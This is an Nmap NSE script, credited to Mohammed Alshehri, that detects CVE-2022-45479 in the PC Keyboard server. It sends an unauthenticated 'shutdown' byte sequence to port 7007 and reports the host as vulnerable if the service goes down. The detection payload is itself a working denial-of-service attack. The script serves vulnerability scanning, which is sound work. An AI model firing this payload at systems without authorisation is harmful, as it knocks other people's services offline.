---
-- https://shellcode.blog/services
---

--Usage:
--nmap -script PCKeyboard_check_script.nse -sT -p 7007 <host>
--Output Example:
-- PORT      STATE SERVICE    REASON
-- 7007/tcp open  PCKeyboard syn-ack
-- | PCKeyboard_check_script: 
-- |   VULNERABLE:
-- |   PCKeyboard Remote Code Execution
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2022-45479
-- |     Risk factor: High  CVSSv3: 9.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |             PC Keyboard allows remote unauthenticated users to send instructions to the server to execute arbitrary code.
-- |           
-- |     Disclosure date: 2022-11-30
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45479


local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
PCKeyboard CVE-2022-45479 is a Remote Code Execution vulnerability.
This script looks the existence of CVE-2022-45479 based on the server's availability after sending a "shutdown" single. 
]]

author = "Mohammed Alshehri"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive","auth", "vuln"}


function set_nmap(host, port)
	port.state = "open"
	port.version.name = "PCKeyboard"
	port.version.product = "30"
	nmap.set_port_version(host, port)
	nmap.set_port_state(host, port, "open")
 end

portrule = shortport.port_or_service(7007, "PCKeyboard", "tcp")
action = function(host,port)
  -- Shutdown signal 
  local detection_code = string.char(0x23, 0x4a, 0x23,0x4b, 0x32, 0x3a, 0x30, 0x31)
  local vuln_45479 = {
    title = "PCKeyboard Remote Code Execution",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    scores = {
      CVSSv3 = "9.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    },
    description = [[
      PC Keyboard allows remote unauthenticated users to send instructions to the server to execute arbitrary code.
    ]],
    IDS = {CVE = "CVE-2022-45479"},
    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45479'    },
    dates = { disclosure = { year = '2022', month = '11', day = '30' } }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

	local sock = nmap.new_socket("tcp")
  sock:set_timeout(1000)

	local constatus,conerr = sock:connect(host, port,"tcp")
  if not constatus then
    stdnse.debug1(
      'Error establishing a TCP connection for %s - %s', host, conerr
      )
    return nil
  end

  local status, senderr = sock:send(detection_code)
  if(status == false) then
    stdnse.debug1(
      'Error sending a TCP message for %s - %s', host, conerr
      )
    stdnse.debug1(senderr)
    return "Error: 2"
  end
  -- close socket
  sock:close()
  stdnse.debug1("------------------------------------ Waiting ------------------------------------")

  -- Wait for the device to shutdown. 
  stdnse.sleep(8)

  local constatus, conerr = sock:connect(host, port,"tcp")
  if not constatus then
    stdnse.debug1(
      'Error establishing a TCP connection for %s - %s', host, conerr
      )
    -- Vulnerable 
    stdnse.debug1("CVE-2022-45479 condition")
    vuln_45479.state = vulns.STATE.VULN
    set_nmap(host, port)
    return vuln_report:make_output (vuln_45479)
  end

  -- Else, we gucci
  stdnse.debug1("Good news! The server is still connectable : )")
  return nil
end